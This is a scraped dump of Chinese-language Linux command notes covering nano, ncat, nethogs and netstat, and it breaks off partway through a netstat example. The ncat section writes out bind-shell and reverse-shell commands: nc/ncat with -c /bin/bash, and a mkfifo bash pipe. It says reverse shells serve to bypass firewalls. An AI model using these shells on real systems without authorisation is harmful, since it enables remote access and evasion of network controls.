Nmap Commands That You Should Know About Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-08-18 06:00:11 "},"Linux-Command/Linux_Command_nano.html":{"url":"Linux-Command/Linux_Command_nano.html","title":"Linux Command Nano","keywords":"","body":"Linux Command Nano 编辑器1. 简介2. 安装2.1 Debian/Ubuntu2.2 CentOS/RHEL3. 使用3.1 创建并打开一个新文件3.2 Ctrl+o 保存文件3.3 Ctrl+k 剪切 Ctrl+u 粘贴3.4 Ctrl+w 搜索文件中的单词3.5 Ctrl+t 替换3.6 CTRL + X 保存退出Linux Command Nano 编辑器 tagsstart 编辑器 tagsstop 1. 简介 GNU nano是一个简单的基于终端的文本编辑器。虽然不如 Emacs 或 Vim 强大，但它易于学习和使用。Nano 非常适合对现有配置文件进行小幅更改或编写简短的纯文本文件。它最初是作为非免费 Pico 编辑器的免费替代品而创建的。Pico 是华盛顿大学 Pine 电子邮件套件中使用的基于终端的编辑器。 Nano 可用于终端窗口或系统控制台。 2. 安装 如 macOS 或 Linux 发行版，可能已经预装了 Nano 文本编辑器。 要检查，只需使用以下命令：nano --version 2.1 Debian/Ubuntu sudo apt update sudo apt-get install nano 2.2 CentOS/RHEL yum install nano 3. 使用 3.1 创建并打开一个新文件 nano new_filename 每当您打开重要的配置文件时，建议使用-w选项。它将以标准格式打开文件。 sudo nano -w /etc/apache2/apache2.conf 图 1.2.46.1：在这里插入图片描述 3.2 Ctrl+o 保存文件 图 1.2.46.2：在这里插入图片描述 3.3 Ctrl+k 剪切 Ctrl+u 粘贴 剪切和粘贴一整行。移动到要剪切的行，然后按Ctrl+k。现在该行已移动到剪贴板，要粘贴它，请转到要粘贴的位置，然后按Ctrl+u 剪切和粘贴选定的文本。选择要剪切的文本，然后按Ctrl+k。现在文本被移动到剪贴板。要粘贴它，请转到要粘贴的位置，然后按Ctrl+u。 3.4 Ctrl+w 搜索文件中的单词 按 Ctrl+w,它将询问要搜索的单词。输入单词 它将搜索单词并将光标放在单词第一次出现的第一个字母上。 3.5 Ctrl+t 替换 在 nano 中启用拼写检查。首先，安装拼写检查包。 sudo apt install spell 然后它会要求输入密码，然后输入密码。然后按y，然后按回车。 要进行拼写检查，请先按 Ctrl+t 现在它会要求您替换不正确的单词 在此处输入要替换的单词 只要你按下回车键 3.6 CTRL + X 保存退出 要退出编辑器，请按CTRL + X。如果有更改，它会询问您是否保存它们。输入Y表示Y es或N表示No，然后按Enter。但如果没有更改，您将立即退出编辑器。 参考： How to Install and Use Nano Text Editor: A Beginner’s Tutorial Nano Text Editor in Linux Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-08-10 10:56:24 "},"Linux-Command/Linux_Command_ncat.html":{"url":"Linux-Command/Linux_Command_ncat.html","title":"Linux Command Ncat","keywords":"","body":"Linux Command ncat1. 简介2. 功能3. 安装4. 参数5. 实例5.1 端口转发5.2 使用代理（使用socks4代理连接邮件服务器）5.3 创建本地HTTP代理5.4 chat server：简单传输数据服务器5.5 文件传输5.6 目录传输5.7 加密你通过网络发送的数据5.8 打开一个shell5.9 指定源端口10.指定源地址Linux Command ncat tagsstart 网络 tagsstop 1. 简介 说起ncat我们不得不说一下Netcat。Netcat用于从TCP/UDP连接中读取或发送网络数据。cat是Linux中查看或连接文件的命令，所以netcat本意为从网络上查看文件内容。而Netcat的作者Hobbit为它添加了非常丰富的功能，使它几乎能够完成网络操作中各式各样的操作，所以Netcat在网络安全领域被称作“TCPIP的瑞士军刀”（\"Swiss-army knife forTCP/IP\"）。 Netcat稳定版1.10由Hobbit在1996年3月发布（开源软件），之后作者没有再对其进行维护，但该工具十多年来依然在被广泛地使用，而且基于Netcat的各种衍生工具也层出不穷，他们在很多方面增强或扩展了Netcat的功能。 Nmap团队开发了Ncat作为Netcat的升级版本，增加了更多的功能（如ssl加密、代理连接通过socks4 获取http），让其更能适应现代网络环境的需求。 2. 功能 互相对话 文件传输 目录传输 压缩传输 加密传输 nmap-ncat.x86_64版nc/ncat nc/ncat所做的就是在两台电脑之间建立链接并返回两个数据流，在这之后所能做的事就看你的想像力了。你能建立一个服务器，传输文件，与朋友聊天，传输流媒体或者用它作为其它协议的独立客户端。 3. 安装 centos 7下安装nc $ yum install nmap-ncat.x86_64 -y $ rpm -ql nmap-ncat 4. 参数 nc -h查看 -4 使用IPV4 -6 使用IPV6 -c, --sh-exec 接收到的命令通过command(例如/bin/bash)执行 -e, --exec 和-c差不多 --lua-exec 接收到的数据通过脚本filename执行 -m, --max-conns 最大并发连接数(单独开启不生效，需配合--keep-open/--broker使用) -d, --delay 读写收发间隔时间 -o, --output 将会话数据转储到文件 -i, --idle-timeout 读写超时时间 -p, --source-port port 指定连接使用的源端口号(client端使用) -s, --source addr 客户端指定连接服务器使用的ip(client端使用) -l, --listen 绑定和监听接入连接(server端使用) -k, --keep-open 在监听模式中接受多个连接(配合-m使用) -n, --nodns 不使用DNS解析主机名 -t, --telnet 响应telnet连接 -u, --udp 使用udp协议，默认tcp -v, --verbose 显示详细信息 -w, --wait 连接超时时间 --allow 允许指定主机连接 --allowfile 允许指定文件内的主机连接 --deny 拒绝指定主机连接 --denyfile 拒绝指定文件内的主机连接 --broker 启用代理模式 --proxy 指定代理主机ip和port --proxy-type 指定代理类型(\"http\" or \"socks4\") --proxy-auth 代理身份验证 5. 实例 5.1 端口转发 $ ncat --sh-exec \"www.lybbn.cn 80\" -l 8080 --keep-open 5.2 使用代理（使用socks4代理连接邮件服务器） $ ncat --proxy www.lybbn.cn --proxy-type socks4 --proxy-auth user smtphost 25 5.3 创建本地HTTP代理 $ ncat -l --proxy-type http localhost 8888 主机A：192.168.1.130 主机B：192.168.1.120 5.4 chat server：简单传输数据服务器 假如你想和你的朋友聊聊，有很多的软件和信息服务可以供你使用。但是，如果你没有这么奢侈的配置，比如你在计算机实验室，所有的对外的连接都是被限制的，你怎样和整天坐在隔壁房间的朋友沟通那？不要郁闷了，netcat提供了这样一种方法，你只需要创建一个Chat服务器，一个预先确定好的端口，这样子他就可以联系到你了。 Server A [root@localhost tmp]# ncat -4 -v -lp 8081 Ncat: Version 6.40 ( http://nmap.org/ncat ) Ncat: Listening on :::8081 Ncat: Listening on 0.0.0.0:8081 Ncat: Connection from 192.168.1.120. Ncat: Connection from 192.168.1.120:34356. hello world!!! nc/ncat 命令在8081端口启动了一个tcp 服务器，所有的标准输出和输入会输出到该端口。输出和输入都在此shell中展示。 Client B [root@localhost ~]# nc -4 -v 192.168.1.130 8081 Ncat: Version 6.40 ( http://nmap.org/ncat ) Ncat: Connected to 192.168.1.130:8081. hello world!!! 不管你在机器B上键入什么都会出现在机器A上。 5.5 文件传输 大部分时间中，我们都在试图通过网络或者其他工具传输文件。有很多种方法，比如FTP,SCP,SMB等等，但是当你只是需要临时或者一次传输文件，真的值得浪费时间来安装配置一个软件到你的机器上嘛。假设，你想要传一个文件file.txt 从A 到B。A或者B都可以作为服务器或者客户端. A作为传输者，B为接收者* Server A [root@localhost tmp]# ncat -v -lp 8081 [root@localhost ~]# ll total 4 -rw-------. 1 root root 1238 Sep 19 12:19 anaconda-ks.cfg [root@localhost ~]# nc -v 192.168.1.130 8081 > file.txt Ncat: Version 6.40 ( http://nmap.org/ncat ) Ncat: Connected to 192.168.1.130:8081. ^C [root@localhost ~]# ll total 40220 -rw-------. 1 root root 1238 Sep 19 12:19 anaconda-ks.cfg -rw-r--r--. 1 root root 41180832 Sep 19 14:33 file.txt B作为传输者，A为接收者* erver A [root@localhost tmp]# ncat -v -lp 8081 > file.txt ... Client B [root@localhost ~]# nc -v 192.168.1.130 8081 5.6 目录传输 发送多个文件，或者整个目录，一样很简单，只需要使用压缩工具tar，压缩后发送压缩包。 5.6.1 通过tar传输一个目录从A到B Server A [root@localhost tmp]# tar cvf - nc_dir | nc -v -lp 8081 Ncat: Version 6.40 ( http://nmap.org/ncat ) Ncat: Listening on :::8081 Ncat: Listening on 0.0.0.0:8081 nc_dir/ nc_dir/an Ncat: Connection from 192.168.1.120. Ncat: Connection from 192.168.1.120:34362. nc_dir/yum.log Client B [root@localhost ~]# ll total 40220 -rw-------. 1 root root 1238 Sep 19 12:19 anaconda-ks.cfg -rw-r--r--. 1 root root 41180832 Sep 19 14:33 file.txt [root@localhost ~]# nc -nv 192.168.1.130 8081 | tar xvf - Ncat: Version 6.40 ( http://nmap.org/ncat ) Ncat: Connected to 192.168.1.130:8081. nc_dir/ nc_dir/an nc_dir/yum.log^C [root@localhost ~]# ll total 40220 -rw-------. 1 root root 1238 Sep 19 12:19 anaconda-ks.cfg -rw-r--r--. 1 root root 41180832 Sep 19 14:33 file.txt drwxr-xr-x. 2 root root 31 Sep 20 2017 nc_dir 这里在A服务器上，我们创建一个tar归档包并且通过-在控制台重定向它，然后使用管道，重定向给netcat，netcat可以通过网络发送它。 在客户端我们下载该压缩包通过netcat 管道然后打开文件。 如果想要节省带宽传输压缩包，我们可以使用bzip2或者其他工具压缩。 5.6.2 通过bzip2压缩传输 Server A [root@localhost tmp]# tar cvf - nc_dir | bzip2 -z | nc -v -lp 8081 Ncat: Version 6.40 ( http://nmap.org/ncat ) Ncat: Listening on :::8081 Ncat: Listening on 0.0.0.0:8081 nc_dir/ nc_dir/an Ncat: Connection from 192.168.1.120. Ncat: Connection from 192.168.1.120:34372. nc_dir/yum.log 使用bzip2解压 Client B [root@localhost ~]# ll total 40220 -rw-------. 1 root root 1238 Sep 19 12:19 anaconda-ks.cfg -rw-r--r--. 1 root root 41180832 Sep 19 14:33 file.txt [root@localhost ~]# nc -nv 192.168.1.130 8081 | bzip2 -d | tar xvf - Ncat: Version 6.40 ( http://nmap.org/ncat ) Ncat: Connected to 192.168.1.130:8081. nc_dir/ nc_dir/an nc_dir/yum.log^C [root@localhost ~]# ll total 40220 -rw-------. 1 root root 1238 Sep 19 12:19 anaconda-ks.cfg -rw-r--r--. 1 root root 41180832 Sep 19 14:33 file.txt drwxr-xr-x. 2 root root 31 Sep 20 2017 nc_dir 5.7 加密你通过网络发送的数据 如果你担心你在网络上发送数据的安全，你可以在发送你的数据之前用如mcrypt的工具加密。 服务端 A [root@localhost tmp]# mcrypt --flush --bare -F -q -m ecb 使用mcrypt工具加密数据。 客户端 B [root@localhost tmp]# ll total 402160 -rw-r--r--. 1 root root 411808322 Sep 19 14:56 test.txt [root@localhost tmp]# nc 192.168.1.130 8081 | mcrypt --flush --bare -F -q -d -m ecb > file.txt Enter passphrase: ^C [root@localhost tmp]# ll total 442376 -rw-r--r--. 1 root root 41180832 Sep 19 15:13 file.txt -rw-r--r--. 1 root root 411808322 Sep 19 14:56 test.txt 使用mcrypt工具解密数据。 以上两个命令会提示需要密码，确保两端使用相同的密码。 这里我们是使用mcrypt用来加密，使用其它任意加密工具都可以。 5）文件传输（可以反向传输） 服务端 [root@localhost tmp]# ncat -nvl 333 -c bash --ssl 客户端 [root@localhost tmp]# ncat -nv 172.16.0.182 333 --ssl 5.8 打开一个shell 我们已经用过远程shell-使用telnet和ssh，但是如果这两个命令没有安装并且我们没有权限安装他们，我们也可以使用netcat创建远程shell。 假设你的netcat支持 -c -e 参数(默认 netcat) Server A [root@localhost tmp]# nc -v -c /bin/bash -lp 8081 Ncat: Version 6.40 ( http://nmap.org/ncat ) Ncat: Listening on :::8081 Ncat: Listening on 0.0.0.0:8081 Ncat: Connection from 192.168.1.120. Ncat: Connection from 192.168.1.120:34404. Client B [root@localhost tmp]# nc -v 192.168.1.130 8081 Ncat: Version 6.40 ( http://nmap.org/ncat ) Ncat: Connected to 192.168.1.130:8081. ip add 1: lo: mtu 65536 qdisc noqueue state UNKNOWN qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: ens33: mtu 1500 qdisc pfifo_fast state UP qlen 1000 link/ether 00:0c:29:0a:cb:57 brd ff:ff:ff:ff:ff:ff inet 192.168.1.130/24 brd 192.168.1.255 scope global ens33 valid_lft forever preferred_lft forever inet6 fe80::21af:eea9:759a:962f/64 scope link valid_lft forever preferred_lft forever 这里我们已经创建了一个netcat服务器并且表示当它连接成功时执行/bin/bash 假如netcat 不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shell Server A [root@server-A ~]# mkfifo /tmp/tmp_fifo [root@server-A ~]# cat /tmp/tmp_fifo | /bin/bash -i 2>&1 | nc -v -lp 8081 > /tmp/tmp_fifo Ncat: Version 6.40 ( http://nmap.org/ncat ) Ncat: Listening on :::8081 Ncat: Listening on 0.0.0.0:8081 这里我们创建了一个fifo文件，然后使用管道命令把这个fifo文件内容定向到shell 2>&1中。是用来重定向标准错误输出和标准输出，然后管道到netcat 运行的端口8081上。至此，我们已经把netcat的输出重定向到fifo文件中。 说明： 从网络收到的输入写到fifo文件中 cat 命令读取fifo文件并且其内容发送给bash命令 bash命令进程受到输入并把它写回到netcat。 netcat 通过网络发送输出到client 至于为什么会成功是因为管道使命令平行执行，fifo文件用来替代正常文件，因为fifo使读取等待而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。 在客户端仅仅简单连接到服务器 Client B [root@client-B ~]# nc 192.168.1.130 8081 [root@server-A ~]# ip add ip add 1: lo: mtu 65536 qdisc noqueue state UNKNOWN qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: ens33: mtu 1500 qdisc pfifo_fast state UP qlen 1000 link/ether 00:0c:29:0a:cb:57 brd ff:ff:ff:ff:ff:ff inet 192.168.1.130/24 brd 192.168.1.255 scope global ens33 valid_lft forever preferred_lft forever inet6 fe80::21af:eea9:759a:962f/64 scope link valid_lft forever preferred_lft forever [root@server-A ~]# 你会得到一个shell提示符在客户端 反向shell 反向shell是指在客户端打开的shell。反向shell这样命名是因为不同于其他配置，这里服务器使用的是由客户提供的服务。 服务端 A [root@server-A ~]# nc -v -lp 8081 Ncat: Version 6.40 ( http://nmap.org/ncat ) Ncat: Listening on :::8081 Ncat: Listening on 0.0.0.0:8081 Ncat: Connection from 192.168.1.120. Ncat: Connection from 192.168.1.120:34414. ls anaconda-ks.cfg file.txt nc_dir ip add 1: lo: mtu 65536 qdisc noqueue state UNKNOWN qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: ens33: mtu 1500 qdisc pfifo_fast state UP qlen 1000 link/ether 00:0c:29:b9:7e:94 brd ff:ff:ff:ff:ff:ff inet 192.168.1.106/24 brd 192.168.1.255 scope global dynamic ens33 valid_lft 7170sec preferred_lft 7170sec inet6 fe80::b95d:60d:d901:d271/64 scope link valid_lft forever preferred_lft forever 3: ens34: mtu 1500 qdisc pfifo_fast state UP qlen 1000 link/ether 00:0c:29:b9:7e:9e brd ff:ff:ff:ff:ff:ff inet 192.168.1.120/24 brd 192.168.1.255 scope global ens34 valid_lft forever preferred_lft forever inet6 fe80::2812:38ee:6773:1a7c/64 scope link valid_lft forever preferred_lft forever 在客户端，简单地告诉netcat在连接完成后，执行shell。 客户端 B [root@client-B ~]# nc -v 192.168.1.130 8081 -c /bin/bash Ncat: Version 6.40 ( http://nmap.org/ncat ) Ncat: Connected to 192.168.1.130:8081. 现在，什么是反向shell的特别之处呢 反向shell经常被用来绕过防火墙的限制，如阻止入站连接。 5.9 指定源端口 假设你的防火墙过滤除25端口外其它所有端口，你需要使用-p选项指定源端口。 服务器端 A [root@server-A ~]# nc -v -lp 8081 Ncat: Version 6.40 ( http://nmap.org/ncat ) Ncat: Listening on :::8081 Ncat: Listening on 0.0.0.0:8081 Ncat: Connection from 192.168.1.120. Ncat: Connection from 192.168.1.120:8082. 客户端 B [root@client-B ~]# nc -v 192.168.1.130 8081 -p 8082 Ncat: Version 6.40 ( http://nmap.org/ncat ) Ncat: Connected to 192.168.1.130:8081. 使用1024以内的端口需要root权限。 该命令将在客户端开启25端口用于通讯，否则将使用随机端口。 10.指定源地址 假设你的机器有多个地址，希望明确指定使用哪个地址用于外部数据通讯。我们可以在netcat中使用-s选项指定ip地址。 服务器端 [root@server-A ~]# nc -v -lp 8081 Ncat: Version 6.40 ( http://nmap.org/ncat ) Ncat: Listening on :::8081 Ncat: Listening on 0.0.0.0:8081 Ncat: Connection from 192.168.1.106. Ncat: Connection from 192.168.1.106:44694. 客户端 B [root@localhost log]# ip add 1: lo: mtu 65536 qdisc noqueue state UNKNOWN qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: ens33: mtu 1500 qdisc pfifo_fast state UP qlen 1000 link/ether 00:0c:29:b9:7e:94 brd ff:ff:ff:ff:ff:ff inet 192.168.1.106/24 brd 192.168.1.255 scope global dynamic ens33 valid_lft 6803sec preferred_lft 6803sec inet6 fe80::b95d:60d:d901:d271/64 scope link valid_lft forever preferred_lft forever 3: ens34: mtu 1500 qdisc pfifo_fast state UP qlen 1000 link/ether 00:0c:29:b9:7e:9e brd ff:ff:ff:ff:ff:ff inet 192.168.1.120/24 brd 192.168.1.255 scope global ens34 valid_lft forever preferred_lft forever inet6 fe80::2812:38ee:6773:1a7c/64 scope link valid_lft forever preferred_lft forever [root@client-B ~]# nc -v 192.168.1.130 8081 -s 192.168.1.106 Ncat: Version 6.40 ( http://nmap.org/ncat ) Ncat: Connected to 192.168.1.130:8081. 该命令将绑定地址192.168.1.106。 参考： ncat(1) — Linux manual page 10 useful ncat (nc) Command Examples for Linux Systems Ncat Linux command https://nmap.org/ncat/ Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 16:06:26 "},"Linux-Command/Linux_Command_Nethogs.html":{"url":"Linux-Command/Linux_Command_Nethogs.html","title":"Linux Command Nethogs","keywords":"","body":"Linux Command Nethogs 查看进程占用带宽Linux Command Nethogs 查看进程占用带宽 Nethogs 是一个终端下的网络流量监控工具可以直观的显示每个进程占用的带宽。 下载：http://sourceforge.net/projects/nethogs/files/nethogs/0.8/nethogs-0.8.0.tar.gz/download $ yum -y install libpcap-devel ncurses-devel $ tar zxvf nethogs-0.8.0.tar.gz $ cd nethogs $ make && make install $ nethogs eth0 参考： Nethogs – Monitor Linux Network Traffic Usage Per Process How to Monitor Network Traffic using nethogs nethogs(8) - Linux man page Linux – Monitoring Network Traffic With nethogs NetHogs——Linux下按进程实时统计网络带宽利用率 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 15:59:08 "},"Linux-Command/Linux_Command_netstat.html":{"url":"Linux-Command/Linux_Command_netstat.html","title":"Linux Command Netstat","keywords":"","body":"Linux Command netstat 统计网络数据1. 介绍2. 格式3. 参数4. 实例实例1：无参数使用实例2：列出所有端口实例3：显示当前UDP连接状况实例4：显示UDP端口号的使用情况实例5：显示网卡列表实例6：显示组播组的关系实例7：显示网络统计信息实例8：显示监听的套接口实例9：显示所有已建立的有效连接实例10：显示关于以太网的统计数据实例11：显示关于路由表的信息实例12：列出所有 tcp 端口实例13：统计机器中网络连接各个状态个数实例14：把状态全都取出来后使用uniq -c统计后再进行排序实例15：找出程序运行的端口实例17：在 netstat 输出中显示 PID 和进程名称实例18：找出运行在指定端口的进程Linux Command netstat 统计网络数据 tagsstart 监控 分析 网络 tagsstop 1. 介绍 netstat命令用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。netstat是在内核中访问网络及相关信息的程序，它能提供TCP连接，TCP和UDP监听，进程内存管理的相关报告。 如果你的计算机有时候接收到的数据报导致出错数据或故障，你不必感到奇怪，TCP/IP可以容许这些类型的错误，并能够自动重发数据报。但如果累计的出错情况数目占到所接收的IP数据报相当大的百分比，或者它的数目正迅速增加，那么你就应该使用netstat查一查为什么会出现这些情况了。 2. 格式 netstat [-acCeFghilMnNoprstuvVwx][-A][--ip] 3. 参数 -a或–all 显示所有连线中的Socket。 -A或– 列出该网络类型连线中的相关地址。 -c或–continuous 持续列出网络状态。 -C或–cache 显示路由器配置的快取信息。 -e或–extend 显示网络其他相关信息。 -F或–fib 显示FIB。 -g或–groups 显示多重广播功能群组组员名单。 -h或–help 在线帮助。 -i或–interfaces 显示网络界面信息表单。 -l或–listening 显示监控中的服务器的Socket。 -M或–masquerade 显示伪装的网络连线。 -n或–numeric 直接使用IP地址，而不通过域名服务器。 -N或–netlink或–symbolic 显示网络硬件外围设备的符号连接名称。 -o或–timers 显示计时器。 -p或–programs 显示正在使用Socket的程序识别码和程序名称。 -r或–route 显示Routing Table。 -s或–statistice 显示网络工作信息统计表。 -t或–tcp 显示TCP传输协议的连线状况。 -u或–udp 显示UDP传输协议的连线状况。 -v或–verbose 显示指令执行过程。 -V或–version 显示版本信息。 -w或–raw 显示RAW传输协议的连线状况。 -x或–unix 此参数的效果和指定”-A unix”参数相同。 –ip或–inet 此参数的效果和指定”-A inet”参数相同。 4. 实例 实例1：无参数使用 $ netstat Active Internet connections (w/o servers) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 268 192.168.120.204:ssh 10.2.0.68:62420 ESTABLISHED udp 0 0 192.168.120.204:4371 10.58.119.119:domain ESTABLISHED Active UNIX domain sockets (w/o servers) Proto RefCnt Flags Type State I-Node Path unix 2 [ ] DGRAM 1491 @/org/kernel/udev/udevd unix 4 [ ] DGRAM 7337 /dev/log unix 2 [ ] DGRAM 708823 unix 2 [ ] DGRAM 7539 unix 3 [ ] STREAM CONNECTED 7287 unix 3 [ ] STREAM CONNECTED 7286 说明： 从整体上看，netstat的输出结果可以分为两个部分： 一个是Active Internet connections，称为有源TCP连接，其中\"Recv-Q\"和\"Send-Q\"指的是接收队列和发送队列。这些数字一般都应该是0。如果不是则表示软件包正在队列中堆积。这种情况只能在非常少的情况见到。 另一个是Active UNIX domain sockets，称为有源Unix域套接口(和网络套接字一样，但是只能用于本机通信，性能可以提高一倍)。 Proto显示连接使用的协议,RefCnt表示连接到本套接口上的进程号,Types显示套接口的类型,State显示套接口当前的状态,Path表示连接到套接口的其它进程使用的路径名。 套接口类型： -t ：TCP -u ：UDP -raw ：RAW类型 --unix ：UNIX域类型 --ax25 ：AX25类型 --ipx ：ipx类型 --netrom ：netrom类型 状态说明： LISTEN：侦听来自远方的TCP端口的连接请求 SYN-SENT：再发送连接请求后等待匹配的连接请求（如果有大量这样的状态包，检查是否中招了） SYN-RECEIVED：再收到和发送一个连接请求后等待对方对连接请求的确认（如有大量此状态，估计被flood攻击了） ESTABLISHED：代表一个打开的连接 FIN-WAIT-1：等待远程TCP连接中断请求，或先前的连接中断请求的确认 FIN-WAIT-2：从远程TCP等待连接中断请求 CLOSE-WAIT：等待从本地用户发来的连接中断请求 CLOSING：等待远程TCP对连接中断的确认 LAST-ACK：等待原来的发向远程TCP的连接中断请求的确认（不是什么好东西，此项出现，检查是否被攻击） TIME-WAIT：等待足够的时间以确保远程TCP接收到连接中断请求的确认 CLOSED：没有任何连接状态 实例2：列出所有端口 $ netstat -a Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 localhost:smux *:* LISTEN tcp 0 0 *:svn *:* LISTEN tcp 0 0 *:ssh *:* LISTEN tcp 0 284 192.168.120.204:ssh 10.2.0.68:62420 ESTABLISHED udp 0 0 localhost:syslog *:* udp 0 0 *:snmp *:* Active UNIX domain sockets (servers and established) Proto RefCnt Flags Type State I-Node Path unix 2 [ ACC ] STREAM LISTENING 708833 /tmp/ssh-yKnDB15725/agent.15725 unix 2 [ ACC ] STREAM LISTENING 7296 /var/run/audispd_events unix 2 [ ] DGRAM 1491 @/org/kernel/udev/udevd unix 4 [ ] DGRAM 7337 /dev/log unix 2 [ ] DGRAM 708823 unix 2 [ ] DGRAM 7539 unix 3 [ ] STREAM CONNECTED 7287 unix 3 [ ] STREAM CONNECTED 7286 说明： 显示一个所有的有效连接信息列表，包括已建立的连接（ESTABLISHED），也包括监听连接请（LISTENING）的那些连接。 实例3：显示当前UDP连接状况 $ netstat -nu Active Internet connections (w/o servers) Proto Recv-Q Send-Q Local Address Foreign Address State udp 0 0 ::ffff:192.168.12:53392 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:56723 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:56480 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:58154 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:44227 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:36954 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:53984 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:57703 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:53613 ::ffff:192.168.9.120:10000 ESTABLISHED 实例4：显示UDP端口号的使用情况 $ netstat -apu Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name udp 0 0 0.0.0.0:890 0.0.0.0:* 726/rpcbind udp 0 0 0.0.0.0:sunrpc 0.0.0.0:* 1/systemd udp 0 0 localhost:323 0.0.0.0:* 760/chronyd udp6 0 0 [::]:890 [::]:* 726/rpcbind udp6 0 0 [::]:sunrpc [::]:* 1/systemd udp6 0 0 localhost:323 [::]:* 760/chronyd 实例5：显示网卡列表 $ netstat -i Kernel Interface table Iface MTU RX-OK RX-ERR RX-DRP RX-OVR TX-OK TX-ERR TX-DRP TX-OVR Flg docker0 1500 0 0 0 0 0 0 0 0 BMU eth0 1500 1450 0 0 0 1637 0 0 0 BMRU lo 65536 72 0 0 0 72 0 0 0 LRU 实例6：显示组播组的关系 $ netstat -g \\IPv6/IPv4 Group Memberships Interface RefCnt Group --------------- ------ --------------------- lo 1 all-systems.mcast.net eth0 1 all-systems.mcast.net docker0 1 all-systems.mcast.net lo 1 ff02::1 lo 1 ff01::1 eth0 1 ff02::1:ffc0:4599 eth0 1 ff02::1 eth0 1 ff01::1 docker0 1 ff02::1 docker0 1 ff01::1 实例7：显示网络统计信息 $ netstat -s Ip: 1254 total packets received 0 forwarded 0 incoming packets discarded 1254 incoming packets delivered 1140 requests sent out 16 dropped because of missing route Icmp: 37 ICMP messages received 0 input ICMP message failed. ICMP input histogram: destination unreachable: 37 37 ICMP messages sent 0 ICMP messages failed ICMP output histogram: destination unreachable: 37 IcmpMsg: InType3: 37 OutType3: 37 Tcp: 4 active connections openings 2 passive connection openings 0 failed connection attempts 0 connection resets received 2 connections established 869 segments received 1047 segments send out 0 segments retransmited 0 bad segments received. 0 resets sent Udp: 163 packets received 37 packets to unknown port received. 0 packet receive errors 339 packets sent 0 receive buffer errors 0 send buffer errors UdpLite: TcpExt: 4 TCP sockets finished time wait in fast timer 24 delayed acks sent 2 packets directly queued to recvmsg prequeue. 274 packet headers predicted 229 acknowledgments not containing data payload received 249 predicted acknowledgments TCPRcvCoalesce: 3 TCPAutoCorking: 8 TCPOrigDataSent: 850 TCPHystartTrainDetect: 1 TCPHystartTrainCwnd: 18 IpExt: InBcastPkts: 147 InOctets: 111816 OutOctets: 767452 InBcastOctets: 14228 InNoECTPkts: 1260 说明： 按照各个协议分别显示其统计数据。如果我们的应用程序（如Web浏览器）运行速度比较慢，或者不能显示Web页之类的数据，那么我们就可以用本选项来查看一下所显示的信息。我们需要仔细查看统计数据的各行，找到出错的关键字，进而确定问题所在。 实例8：显示监听的套接口 $ netstat -l Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 localhost:smtp 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:sunrpc 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:ssh 0.0.0.0:* LISTEN tcp6 0 0 localhost:smtp [::]:* LISTEN tcp6 0 0 [::]:sunrpc [::]:* LISTEN tcp6 0 0 [::]:ssh [::]:* LISTEN udp 0 0 0.0.0.0:890 0.0.0.0:* udp 0 0 0.0.0.0:sunrpc 0.0.0.0:* udp 0 0 localhost:323 0.0.0.0:* udp6 0 0 [::]:890 [::]:* udp6 0 0 [::]:sunrpc [::]:* udp6 0 0 localhost:323 [::]:* raw6 0 0 [::]:ipv6-icmp [::]:* 7 Active UNIX domain sockets (only servers) Proto RefCnt Flags Type State I-Node Path unix 2 [ ACC ] STREAM LISTENING 23300 /var/run/docker.sock unix 2 [ ACC ] STREAM LISTENING 17690 /run/dbus/system_bus_socket unix 2 [ ACC ] STREAM LISTENING 23342 /var/run/docker/libcontainerd/docker-containerd.sock 实例9：显示所有已建立的有效连接 $ netstat -n Active Internet connections (w/o servers) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 52 192.168.211.15:22 192.168.211.1:49878 ESTABLISHED tcp 0 0 192.168.211.15:22 192.168.211.1:64318 ESTABLISHED Active UNIX domain sockets (w/o servers) Proto RefCnt Flags Type State I-Node Path unix 2 [ ] DGRAM 19782 /var/run/chrony/chronyd.sock unix 2 [ ] DGRAM 12252 /run/systemd/shutdownd unix 3 [ ] DGRAM 9450 /run/systemd/notify 实例10：显示关于以太网的统计数据 $ netstat -e Active Internet connections (w/o servers) Proto Recv-Q Send-Q Local Address Foreign Address State User Inode tcp 0 52 localhost.localdoma:ssh 192.168.211.1:49878 ESTABLISHED root 